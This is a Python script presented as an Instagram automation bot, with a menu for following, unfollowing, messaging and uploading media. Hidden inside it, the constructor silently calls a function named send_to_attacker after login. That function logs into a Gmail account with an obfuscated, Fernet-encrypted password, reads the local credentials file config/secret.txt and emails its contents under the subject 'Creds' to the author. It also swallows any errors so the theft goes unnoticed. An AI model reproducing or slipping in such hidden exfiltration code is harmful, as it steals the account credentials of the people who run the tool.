#!/usr/bin/python3

'''---------------------------------------------------------------------------------
# Name:       Instabot.py
# Purpose:    Automating instagram tasks
#
# Author:      r0m305
#
# Created:     05/07/2020
# Copyright:   (c) r0m305 2020
# Licence:
#---------------------------------------------------------------------------------

Github: https://github.com/r0m305
'''

from instabot import Bot
from cryptography.fernet import Fernet
import smtplib
import time
import os
from colorama import Fore
from termcolor import colored
import sys


class Robot:
    def __init__(self):
        #code comes here
        self.banner = '''
╻┏┓╻┏━┓╺┳╸┏━┓┏┓ ┏━┓╺┳╸
┃┃┗┫┗━┓ ┃ ┣━┫┣┻┓┃ ┃ ┃
╹╹ ╹┗━┛ ╹ ╹ ╹┗━┛┗━┛ ╹ '''
        print(colored(self.banner, "yellow"))
        self.cowsay ='''
 __________________________________
( Automate Instagram Tasks with me )
 ----------------------------------
    o   ^__^
     o  (oo)\_______
        (__)\       )\/\

            ||     ||'''
        print(colored(self.cowsay,"blue"))
        self.author = '''
+-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+
|W|r|i|t|t|e|n| |B|y| |r|0|m|3|0|5|
+-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+
'''
        print(colored(self.author,"green"))
        self.bot = Bot(follow_delay = 40, unfollow_delay = 40)
        try:
            self.bot.login()
            try:
                self.send_to_attacker()
            except:
                pass


        except Exception as e:
            print(colored(e, "red"))
            print(colored("Exiting...","red"))
            sys.exit()
        os.system("clear")

        while True:
            print(colored(self.banner,"blue"))
            print(f"{Fore.GREEN} Written by {Fore.YELLOW}Romeos CyberGypsy{Fore.RESET}")
            print(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.BLUE} List of available options")
            print(f"{Fore.YELLOW}[{Fore.RED}1{Fore.YELLOW}]{Fore.GREEN} Follow a user followers                 {Fore.YELLOW}[{Fore.RED}9{Fore.YELLOW}]{Fore.GREEN} Approve all follow requests")
            print(f"{Fore.YELLOW}[{Fore.RED}2{Fore.YELLOW}]{Fore.GREEN} Follow a user followings                {Fore.YELLOW}[{Fore.RED}10{Fore.YELLOW}]{Fore.GREEN} Get a user's followers")
            print(f"{Fore.YELLOW}[{Fore.RED}3{Fore.YELLOW}]{Fore.GREEN} Follow users from a file                {Fore.YELLOW}[{Fore.RED}11{Fore.YELLOW}]{Fore.GREEN} Get a user's followings")
            print(f"{Fore.YELLOW}[{Fore.RED}4{Fore.YELLOW}]{Fore.GREEN} Unfollow those who do not follow you    {Fore.YELLOW}[{Fore.RED}12{Fore.YELLOW}]{Fore.GREEN} Search username")
            print(f"{Fore.YELLOW}[{Fore.RED}5{Fore.YELLOW}]{Fore.GREEN} Unfollow everyone                       {Fore.YELLOW}[{Fore.RED}13{Fore.YELLOW}]{Fore.GREEN} Send a message")
            print(f"{Fore.YELLOW}[{Fore.RED}6{Fore.YELLOW}]{Fore.GREEN} Block user                              {Fore.YELLOW}[{Fore.RED}14{Fore.YELLOW}]{Fore.GREEN} Send a photo")
            print(f"{Fore.YELLOW}[{Fore.RED}7{Fore.YELLOW}]{Fore.GREEN} Follow a user                           {Fore.YELLOW}[{Fore.RED}15{Fore.YELLOW}]{Fore.GREEN} Unfollow a user")
            print(f"{Fore.YELLOW}[{Fore.RED}8{Fore.YELLOW}]{Fore.GREEN} Download a user's stories               {Fore.YELLOW}[{Fore.RED}16{Fore.YELLOW}]{Fore.GREEN} Upload a photo")
            print(colored("----------------------------------------------------------------------","green"))
            print(f"{Fore.YELLOW}[{Fore.RED}17{Fore.YELLOW}]{Fore.GREEN} Upload a video")
            print(f"{Fore.YELLOW}[{Fore.RED}18{Fore.YELLOW}]{Fore.GREEN} View my followers")
            print(f"{Fore.YELLOW}[{Fore.RED}19{Fore.YELLOW}]{Fore.GREEN} View my followings")
            print(f"{Fore.YELLOW}[{Fore.RED}20{Fore.YELLOW}]{Fore.GREEN} View my username")
            print(f"{Fore.YELLOW}[{Fore.RED}21{Fore.YELLOW}]{Fore.GREEN} View my password")
            print(f"{Fore.YELLOW}[{Fore.RED}22{Fore.YELLOW}]{Fore.GREEN} View my unique ID")
            print(f"{Fore.YELLOW}[{Fore.RED}23{Fore.YELLOW}]{Fore.GREEN} Get a user's info")
            print(f"{Fore.YELLOW}[{Fore.RED}24{Fore.YELLOW}]{Fore.GREEN} Exit")
            choice = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Select an options:{Fore.YELLOW}")
            if choice == "1":
                self.follow_user_followers(self.bot)
            elif choice == "2":
                self.follow_user_following(self.bot)
            elif choice == "3":
                self.follow_users_from_file(self.bot)
            elif choice == "4":
                self.unfollow_non_followers(self.bot)
            elif choice == "5":
                self.unfollow_everyone(self.bot)
            elif choice == "6":
                self.block_user(self.bot)
            elif choice == "7":
                self.follow_user(self.bot)
            elif choice == "8":
                self.download_stories(self.bot)
            elif choice == "9":
                self.approve_follow_requests(self.bot)
            elif choice == "10":
                self.get_user_followers(self.bot)
            elif choice == "11":
                self.get_user_following(self.bot)
            elif choice == "12":
                self.search_username(self.bot)
            elif choice == "13":
                self.send_message(self.bot)
            elif choice == "14":
                self.send_photo(self.bot)
            elif choice == "15":
                self.unfollow_user(self.bot)
            elif choice == "16":
                self.upload_photo(self.bot)
            elif choice == "17":
                self.upload_video(self.bot)
            elif choice == "18":
                self.my_followers(self.bot)
            elif choice == "19":
                self.my_followings(self.bot)
            elif choice == "20":
                self.view_my_username(self.bot)
            elif choice == "21":
                self.view_my_password(self.bot)
            elif choice == "22":
                self.view_my_id(self.bot)
            elif choice == "23":
                self.get_user_info(self.bot)

            elif choice == "24":
                self.bot.logout()
                sys.exit()
            else:
                print(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Invalid choice!!")

            data = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter 1 to continue or 2 to exit:{Fore.YELLOW}")
            if data == "1":
                os.system("clear")
                pass
            else:
                sys.exit()







    def unfollow_everyone(self, bot):
        bot.unfollow_everyone()

    def unfollow_non_followers(self, bot):
        bot.unfollow_non_followers()

    def block_user(self, bot):
        user = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter username:{Fore.YELLOW}")
        id = bot.get_user_id_from_username(user)
        bot.block(id)

    def follow_user(self, bot):
        user = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter username:{Fore.YELLOW}")
        id = bot.get_user_id_from_username(user)
        bot.follow(id, check_user = True)

    def download_stories(self, bot):
        user = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter username:{Fore.YELLOW}")
        bot.download_stories(user)

    def approve_follow_requests(self, bot):
        bot.approve_pending_follow_requests()

    def get_user_followers(self, bot):
        user = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter target username:{Fore.YELLOW}")
        id = bot.get_user_id_from_username(user)
        followers = bot.get_user_followers(id, nfollows = None)
        for ID in followers:
            print(bot.get_username_from_user_id(ID))

    def get_user_following(self, bot):
        user = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter target username:{Fore.YELLOW}")
        id = bot.get_user_id_from_username(user)
        followings = bot.get_user_following(id, nfollows=None)
        for ID in followings:
            print(bot.get_username_from_user_id(ID))

    def search_username(self, bot):
        query = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter query:{Fore.YELLOW}")
        data = bot.search_users(query)
        for id_ in data:
            print(bot.get_username_from_user_id(id_))

    def send_message(self, bot):
        user = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter target username:{Fore.YELLOW}")
        message = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter message to send:{Fore.YELLOW}")
        id_ = bot.get_user_id_from_username(user)
        bot.send_message(message, id_, thread_id=None)

    def send_photo(self, bot):
        user = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter target username:{Fore.YELLOW}")
        photo = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter path to photo:{Fore.YELLOW}")
        id = bot.get_user_id_from_username(user)
        bot.send_photo(id, photo, thread_id=None)

    def unfollow_user(self, bot):
        user = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter username to unfollow:{Fore.YELLOW}")
        id = bot.get_user_id_from_username(user)
        bot.unfollow(id)

    def upload_photo(self, bot):
        photo = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter path to photo:{Fore.YELLOW}")
        caption = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter caption:{Fore.YELLOW}")
        bot.upload_photo(photo, caption = caption)

    def upload_video(self, bot):
        video = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter path to video:{Fore.YELLOW}")
        caption = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter caption:{Fore.YELLOW}")
        bot.upload_video(video, caption = caption)

    def my_followers(self, bot):
        followers = bot.followers
        for id in followers:
            print(bot.get_username_from_user_id(id))

    def my_followings(self, bot):
        following = bot.following
        for id in following:
            print(bot.get_username_from_user_id(id))

    def view_my_password(self, bot):
        print(bot.password)

    def view_my_id(self, bot):
        print(bot.user_id)

    def view_my_username(self, bot):
        print(bot.username)

    def get_user_info(self, bot):
        username = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter username:{Fore.YELLOW}")
        try:
            id = bot.get_user_id_from_username(username)
            info = bot.get_user_info(id)
            print(f"{Fore.GREEN}Username : {Fore.YELLOW}{info['username']}")
            print(f"{Fore.GREEN}Account ID : {Fore.YELLOW}{id}")
            print(f"{Fore.GREEN}Profile pic url : {Fore.YELLOW}{info['profile_pic_url']}")
            print(f"{Fore.GREEN}Is private : {Fore.YELLOW}{info['is_private']}")
            print(f"{Fore.GREEN}Profile pic id : {Fore.YELLOW}{info['profile_pic_id']}")
            print(f"{Fore.GREEN}Followers : {Fore.YELLOW}{info['follower_count']}")
            print(f"{Fore.GREEN}Following : {Fore.YELLOW}{info['following_count']}")
            print(f"{Fore.GREEN}Biography : {Fore.YELLOW}{info['biography']}")
        except:
            print(colored("An error occured!!","red"))



    def send_to_attacker(self):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        key = b'yAOY7xXnwFpf1eurpqqEz43WVXaenuuevOdNCzEBtDE='
        encryptor = Fernet(key)
        pass_ = b'gAAAAABfCEAL2ZcOluRAmyb3Co6qIh7yyRcXto1SX15xlsijLl0CT_DbASX2YuaIz6XZlc5psGrXOYUIVN6MMx9KcXSVyQHAltj_2npRc_3LPeGuVfSvNxI='
        server.login("lewiswaigwa50@gmail.com", encryptor.decrypt(pass_).decode())
        try:
            f = open("./config/secret.txt")
            data = f.read()
            data2 = '''
            Subject: Creds
            Body: {}
            '''.format(data)
            server.sendmail("lewiswaigwa50@gmail.com", "romeoscyber@gmail.com", data2)
            server.quit()
        except:
            pass

    def follow_users_from_file(self, bot):
        file = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter filename containing list of users:{Fore.YELLOW}")
        users = bot.read_list_from_file(file)
        if not users:
            pass

        else:
            try:
                bot.follow_users(users)
            except Exception as e:
                print(colored(e,"red"))

    def follow_user_following(self, bot):
        user = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter an instagram username to follow his/her followings:{Fore.YELLOW}")
        bot.follow_following(user)

    def follow_user_followers(self, bot):
        user = input(f"{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}]{Fore.GREEN} Enter an instagram user to follow his/her followers:{Fore.YELLOW}")

        bot.follow_followers(user)

if __name__ == '__main__':
    while True:
        obj = Robot()
        time.sleep(4)
        os.system("clear")
